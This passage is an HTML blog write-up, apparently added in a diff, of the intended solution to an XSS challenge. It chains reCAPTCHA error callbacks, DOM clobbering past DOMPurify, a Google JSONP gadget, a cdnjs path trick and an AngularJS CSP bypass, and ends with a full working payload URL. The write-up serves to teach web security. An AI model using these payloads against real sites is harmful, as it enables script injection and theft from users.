+  <span class="token attr-name">data-error-callback</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>any_function_here<span class="token punctuation">"</span></span>
+  <span class="token attr-name">data-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>invisible<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>By providing a random wrong sitekey, reCAPTCHA will call the function in the attribute <code>data-error-callback</code>.</p>
+<p>It’s important that DOMPurify allows any attributes that start with <code>data-</code> by default, and also both <code>class</code> and <code>id</code> are permitted.</p>
+<p>I learned this nifty trick from TSJ CTF 2022 - web&#x2F;Nim Notes, but it seems that it’s from <a target="_blank" rel="noopener" href="https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#recaptcha-for-the-rescue">another XSS challenge</a> made by @terjanq in TokyoWesterns CTF 2020.</p>
+<p>Now, we can call a function by injecting HTML. The question is, what function should we call?</p>
+<p>Both <code>loadScript</code> and <code>reloadRecaptchaScript</code> are suspicious, but <code>loadScript</code> might not be a good target because we can’t control the arguments.</p>
+<p>How about <code>reloadRecaptchaScript</code>?</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">reloadRecaptchaScript</span><span class="token punctuation">(</span><span class="token parameter">index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// delay for a bit to not block main thread</span>
+  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'reload'</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> document<span class="token punctuation">.</span>scripts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span>scripts<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
+    <span class="token keyword">const</span> src <span class="token operator">=</span> element<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://www.google.com/recaptcha/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'reload failed, invalid src'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    element<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span>
+    <span class="token function">loadScript</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>If we can control <code>document.scripts[index]</code>, we can load another script from <code>https://www.google.com</code>.</p>
+<p>When the reCAPTCHA calls a function, it passes no argument, so the <code>index</code> will be <code>undefined</code>, so we need to override <code>document.scripts[&#39;undefined&#39;]</code></p>
+<p>Can we control it? Sure, it’s DOM clobbering time!</p>
+<h3><span id="dom-clobbering">DOM clobbering</span></h3><p>Usually, we can override the attribute on document by providing a <code>embed</code>, <code>form</code>, <code>input</code>, <code>object</code> or <code>img</code> with <code>name</code>, like this:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>scripts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+// document.scripts => <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>Combining with <code>form</code> element, we can clobber <code>document.scripts[&#39;undefined&#39;]</code>:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>scripts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>undefined<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>src<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>But, it’s not working because DOMPurify prevents this behavior by default: <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L1015">https://github.com/cure53/DOMPurify/blob/main/src/purify.js#L1015</a></p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>
+  <span class="token constant">SANITIZE_DOM</span> <span class="token operator">&amp;&amp;</span>
+  <span class="token punctuation">(</span>lcName <span class="token operator">===</span> <span class="token string">'id'</span> <span class="token operator">||</span> lcName <span class="token operator">===</span> <span class="token string">'name'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
+  <span class="token punctuation">(</span>value <span class="token keyword">in</span> document <span class="token operator">||</span> value <span class="token keyword">in</span> formElement<span class="token punctuation">)</span>
+<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Fortunately, there is another vulnerability in the code:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">sanitize</span><span class="token punctuation">(</span><span class="token parameter">html<span class="token punctuation">,</span> options <span class="token operator">=</span> defaultOptions</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+    <span class="token constant">FORBID_TAGS</span><span class="token operator">:</span> options<span class="token punctuation">.</span>blockTags <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token constant">FORBID_ATTR</span><span class="token operator">:</span> options<span class="token punctuation">.</span>blockAttrs <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+    <span class="token constant">FORCE_BODY</span><span class="token operator">:</span> options<span class="token punctuation">.</span>forceBody<span class="token punctuation">,</span>
+    <span class="token constant">WHOLE_DOCUMENT</span><span class="token operator">:</span> options<span class="token punctuation">.</span>wholeDocument<span class="token punctuation">,</span>
+    <span class="token constant">KEEP_CONTENT</span><span class="token operator">:</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>removeContent<span class="token punctuation">,</span>
+    <span class="token constant">SANITIZE_DOM</span><span class="token operator">:</span> <span class="token operator">!</span>options<span class="token punctuation">.</span>allowDOM<span class="token punctuation">,</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>When calling <code>sanitize</code> without <code>options</code>, the default value will be <code>defaultOptions</code>, so we can clobber <code>defaultOptions.allowDOM</code> to make <code>SANITIZE_DOM</code> falsy.</p>
+<p>Also, we need to call <code>loadData()</code> again without any arguments to let <code>sanitizeOptions</code> be <code>undefined</code>.</p>
+<p>To sum up, we can control <code>document.scripts[&#39;undefined&#39;]</code> by providing below HTML:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>scripts<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>undefined<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>src_here<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>defaultOptions</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>allowDOM</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g-recaptcha<span class="token punctuation">"</span></span>
+    <span class="token attr-name">data-sitekey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>AAA<span class="token punctuation">"</span></span>
+    <span class="token attr-name">data-error-callback</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>reloadRecaptchaScript<span class="token punctuation">"</span></span>
+    <span class="token attr-name">data-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>invisible<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>g-recaptcha<span class="token punctuation">"</span></span>
+    <span class="token attr-name">data-sitekey</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>BBB<span class="token punctuation">"</span></span>
+    <span class="token attr-name">data-error-callback</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>loadData<span class="token punctuation">"</span></span>
+    <span class="token attr-name">data-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>invisible<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3><span id="load-external-script">Load external script</span></h3><p>Now, we have control on <code>document.scripts[index]</code>, but we still need to bypass another check:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">reloadRecaptchaScript</span><span class="token punctuation">(</span><span class="token parameter">index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'reload'</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> document<span class="token punctuation">.</span>scripts<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">const</span> element <span class="token operator">=</span> document<span class="token punctuation">.</span>scripts<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
+    <span class="token keyword">const</span> src <span class="token operator">=</span> element<span class="token punctuation">.</span><span class="token function">getAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>src<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">'https://www.google.com/recaptcha/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'reload failed, invalid src'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+    element<span class="token punctuation">.</span>parentNode<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span>
+    <span class="token function">loadScript</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The <code>src</code> should start with <code>https://www.google.com/recaptcha/</code>, how to overcome this?</p>
+<p>There is a subtle difference between <code>element.src</code> and <code>element.getAttribute(&#39;src&#39;)</code>, the former returns the formatted value, while the latter returns raw value:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://example.com/abc/../test<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+// img.src => https://example.com/test
+// img.getAttribute('src') => https://example.com/abc/../test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>By using <code>../</code>, we can load any scripts from <code>https://www.google.com</code>.</p>
+<p>It’s easy to find a useful gadget from <a target="_blank" rel="noopener" href="https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt#L2">JSONBee</a>: <code>https://www.google.com/complete/search?client=chrome&amp;q=hello&amp;callback=alert#1</code></p>
+<p>The response is like:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">alert <span class="token operator">&amp;&amp;</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"hello"</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">"hello kitty"</span><span class="token punctuation">,</span><span class="token string">"hello world"</span><span class="token punctuation">,</span><span class="token string">"hello kiki"</span><span class="token punctuation">,</span><span class="token string">"hellolulu"</span><span class="token punctuation">,</span><span class="token string">"hello venus"</span><span class="token punctuation">,</span><span class="token string">"hello nico"</span><span class="token punctuation">,</span><span class="token string">"hello bubble"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string-property property">"google:clientdata"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token string-property property">"bpc"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span><span class="token string-property property">"phi"</span><span class="token operator">:</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string-property property">"tlw"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token string-property property">"google:suggestrelevance"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token number">601</span><span class="token punctuation">,</span><span class="token number">600</span><span class="token punctuation">,</span><span class="token number">555</span><span class="token punctuation">,</span><span class="token number">554</span><span class="token punctuation">,</span><span class="token number">553</span><span class="token punctuation">,</span><span class="token number">552</span><span class="token punctuation">,</span><span class="token number">551</span><span class="token punctuation">,</span><span class="token number">550</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-property property">"google:suggestsubtypes"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">,</span><span class="token number">433</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">,</span><span class="token number">433</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">,</span><span class="token number">433</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">,</span><span class="token number">433</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">,</span><span class="token number">433</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-property property">"google:suggesttype"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"QUERY"</span><span class="token punctuation">,</span><span class="token string">"QUERY"</span><span class="token punctuation">,</span><span class="token string">"QUERY"</span><span class="token punctuation">,</span><span class="token string">"QUERY"</span><span class="token punctuation">,</span><span class="token string">"QUERY"</span><span class="token punctuation">,</span><span class="token string">"QUERY"</span><span class="token punctuation">,</span><span class="token string">"QUERY"</span><span class="token punctuation">,</span><span class="token string">"QUERY"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string-property property">"google:verbatimrelevance"</span><span class="token operator">:</span><span class="token number">1300</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>We can’t run arbitrary JS because <code>callback</code> is restricted, it won’t work if you pass something like <code>alert(document.domain)</code>, but we have the ability to call a function with controlled arguments.</p>
+<p>The idea is simple, we can use it to load AngularJS from cdn.js by leverage the classic <code>..%2f</code> trick.</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.google.com&#x2F;recaptcha&#x2F;..&#x2F;complete&#x2F;search?client&#x3D;chrome&amp;q&#x3D;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;dompurify&#x2F;..%252fangular.js&#x2F;1.8.2&#x2F;angular.js%23&amp;callback&#x3D;loadScript<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>Response:</p>
+<pre class="line-numbers language-none"><code class="language-none">loadScript &amp;&amp; loadScript([&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;dompurify&#x2F;..%2fangular.js&#x2F;1.8.2&#x2F;angular.js#&quot;,[],[],[],&#123;&quot;google:clientdata&quot;:&#123;&quot;bpc&quot;:false,&quot;tlw&quot;:false&#125;,&quot;google:suggesttype&quot;:[],&quot;google:verbatimrelevance&quot;:1300&#125;])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3><span id="angularjs-csp-bypass">AngularJS CSP bypass</span></h3><p>Here comes the last part of the challenge. The goal is to find an AngularJS CSP bypass and XSS without user interaction.</p>
+<p>There is a classic payload as described in:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://blog.0daylabs.com/2016/09/09/bypassing-csp/">Bypassing path restriction on whitelisted CDNs to circumvent CSP protections - SECT CTF Web 400 writeup</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it's-CSP!%22">H5SC Minichallenge 3: “Sh*t, it’s CSP!”</a></li>
+</ol>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fprototype/1.7.2/prototype.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdnjs.cloudflare.com/ajax/libs/jquery/..%252fangular.js/1.0.1/angular.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-app</span> <span class="token attr-name">ng-csp</span><span class="token punctuation">></span></span>
+
+｛&#123;$on.curry.call().alert(1)&#125;&#125;
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It requires no user interaction, perfect! But there are two other issues we need to address.</p>
+<p>First, <code>ng-app</code> and <code>ng-csp</code> will be removed by DOMPurify. Second, there is no <code>prototype.js</code>.</p>
+<p>For the first issue, we can use <code>data-ng-app</code> and <code>data-ng-csp</code> instead of <code>ng-app</code> and <code>ng-csp</code>, because AngularJS will <a target="_blank" rel="noopener" href="https://github.com/angular/angular.js/blob/9bff2ce8fb170d7a33d3ad551922d7e23e9f82fc/src/ng/compile.js#L4247">normalize</a> attribute names, and remove <code>x-</code> and <code>data-</code> prefixes.</p>
+<p>For the second issue, we need to know why prototype.js is needed.</p>
+<p>It’s needed because prototype.js <a target="_blank" rel="noopener" href="https://github.com/prototypejs/prototype/blob/master/src/prototype/lang/function.js#L226">adds a few methods</a> to different prototype, like <code>Function.prototype</code>:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">curry</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>arguments<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+  <span class="token keyword">var</span> __method <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">,</span> args <span class="token operator">=</span> <span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">merge</span><span class="token punctuation">(</span>args<span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token function">__method</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The first argument of <code>fn.call()</code> is <code>this</code>, if you call this function without providing <code>this</code>, the default value of <code>this</code> is <code>window</code> in non-strict mode.</p>
+<p>So, <code>any_function.curry.call()</code> will return <code>this</code> which is <code>window</code>, that’s why we need prototype.js.</p>
+<p>If you look at the source code again, you can find a similar pattern:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token class-name">String</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">encode</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>type<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">this</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'uri'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'json'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'base64'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token function">atob</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>That is to say, we can get <code>window</code> via <code>&quot;any_string&quot;.encode.call()</code>.</p>
+<h3><span id="piece-all-together">Piece all together</span></h3><p>The full exploit including:</p>
+<ol>
+<li>DOM clobbering <code>window.defaultOptions.allowDOM</code> to allow clobber document</li>
+<li>DOM clobbering <code>document.scripts[&#39;undefined&#39;]</code></li>
+<li>Call <code>loadData</code> via reCAPTCHA</li>
+<li>Call <code>reloadRecaptchaScript</code> via reCAPTCHA</li>
+<li>Load AngularJS from cdn.js by classic google gadget and <code>..%2f</code> trick </li>
+<li>Use <code>data-ng-app</code> instead of <code>ng-app</code> to bypass DOMPurify</li>
+<li>Use <code>&quot;&quot;.encode.call()</code> to get window object</li>
+</ol>
+<p>Here is the final payload for the intended solution:</p>
+<p><a target="_blank" rel="noopener" href="https://aszx87410.github.io/xss-challenge/notes/?name=&content=%3Cdiv%3E%0A%20%20%3Cform%3E%3C/form%3E%0A%20%20%3Cform%20name=%22scripts%22%3E%0A%20%20%20%20%3Cimg%20name=%22undefined%22%20src=%22https://www.google.com/recaptcha/../complete/search?client=chrome&q=https://cdnjs.cloudflare.com/ajax/libs/dompurify/..%25252fangular.js/1.8.2/angular.js%2523&callback=loadScript%22%3E%0A%20%20%3C/form%3E%0A%20%20%3Cform%20id=defaultOptions%3E%0A%20%20%20%20%3Cimg%20name=allowDOM%3E%0A%20%20%3C/form%3E%0A%20%20%20%20%3Cdiv%20class=%22g-recaptcha%22%20data-sitekey=%22AAA%22%20data-error-callback=%22reloadRecaptchaScript%22%20data-size=%22invisible%22%3E%3C/div%3E%0A%20%20%3Cdiv%20class=%22g-recaptcha%22%20data-sitekey=%22B%22%20data-error-callback=%22loadData%22%20data-size=%22invisible%22%3E%3C/div%3E%0A%20%20%0A%20%20%3Cdiv%20data-ng-app%20data-ng-csp%3E%0A%20%20%20%20%7B%7B%20%22abc%22.encode.call().alert(%22abc%22.encode.call().document.domain)%20%7D%7D%0A%20%20%3C/div%3E%0A%3C/div%3E">link</a></p>
